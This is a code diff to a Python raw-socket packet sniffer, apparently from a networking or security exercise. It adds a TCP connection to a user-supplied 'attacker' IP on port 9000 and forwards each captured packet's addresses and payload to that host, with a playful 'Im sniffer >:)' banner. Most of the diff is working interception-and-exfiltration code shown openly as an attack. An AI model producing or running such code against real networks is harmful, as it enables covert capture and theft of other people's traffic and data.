@@ -24,9 +24,7 @@ def open_socket():
     # https://www.iana.org/assignments/protocol-numbers/protocol-numbers.xhtml
 
     try:
-        # HOST = socket.gethostname()
         s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
-        # s.bind((HOST, 0))
         print("Listening socket creation successful........\n")
     except socket.error as err:
         print("Socket could not be created. Error code : {}".format(err))
@@ -34,8 +32,11 @@ def open_socket():
         
     client_ip = input("Enter IP address of client: ")
     server_ip = input("Enter IP address of server: ")
+    
+    attacker_ip = input("Enter IP address of attacker: ")       # connect to attacker
+    a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    a.connect((attacker_ip, 9000))
 
-   
     while True:
         package, add = s.recvfrom(65535)
 
@@ -117,18 +118,29 @@ def open_socket():
             continue
 
         if (client_ip in source_addr or server_ip in source_addr) and data_length > 0:
-            print("Source MAC Address     : {}".format(src_mac))
-            print("Destination MAC Address: {}".format(dest_mac))
-            print("IP Protocol	          : {}".format(protocol_dict[protocol]))
-            print("Source IP Address      : {}".format(source_addr))
-            print("Destination IP Address : {}".format(destination_addr))
-            print("{} Data length         : {}".format(protocol_dict[protocol], data_length))
-            print("Data Sniffed		  : {}".format(rcv_Data))
-            print("\n")
-
-        
-
-
-
+            
+            if destination_addr == attacker_ip:
+                continue
+            
+            msg = (
+                f"Source MAC Address     : {src_mac}\n"
+                f"Destination MAC Address: {dest_mac}\n"
+                f"IP Protocol            : {protocol_dict[protocol]}\n"
+                f"Source IP Address      : {source_addr}\n"
+                f"Destination IP Address : {destination_addr}\n"
+                f"{protocol_dict[protocol]} Data length         : {data_length}\n"
+                f"Data Sniffed           : {rcv_Data}\n\n"
+            )
+            
+            print(msg)
+            
+            try:                                                # send messages to attacker    
+                a.sendall(msg.encode())
+            except socket.error as err:
+                print(f"Send failed: {err}")
+            
 if __name__ == '__main__':
+    print("run 'ipconfig' (windows) or 'ip a' (linux) for IP address of machine.\n\n")
+    print("Im sniffer >:)\n\n")
+    
     open_socket()
